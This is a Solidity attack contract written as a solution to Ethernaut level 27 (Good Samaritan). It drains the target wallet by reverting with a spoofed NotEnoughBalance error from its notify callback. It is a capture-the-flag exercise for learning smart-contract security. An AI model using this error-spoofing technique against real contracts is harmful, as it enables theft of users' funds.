// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./interfaces/IGoodSamaritan.sol";

/**
 * @title Good Samaritan Attack (Ethernaut Challenge Level 27 - Good Samaritan)
 * @author Emre Tepe (@emretepedev)
 * @notice Attack contract for level 27
 * @custom:ethernaut https://ethernaut.openzeppelin.com/level/0x000Fa85A0a533C3221ecf8Ab4D598b34B48B22Fd
 */
contract GoodSamaritanAttack {
    error NotEnoughBalance();

    uint256 private _amount;

    /*//////////////////////////////////////////////////////////////
                                Attack
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Attack and solve the level
     * @param target Address of target contract
     */
    function attack(IGoodSamaritan target) external {
        _amount = 0;

        require(!target.requestDonation() && _amount > 10, "GoodSamaritan: Attack failed");
    }

    /*//////////////////////////////////////////////////////////////
                            Helpers & Others
    //////////////////////////////////////////////////////////////*/

    /**
     * @param amount Received amount from victim contract
     */
    function notify(uint256 amount) external {
        _amount = amount;

        if (10 == amount) revert NotEnoughBalance();
    }
}
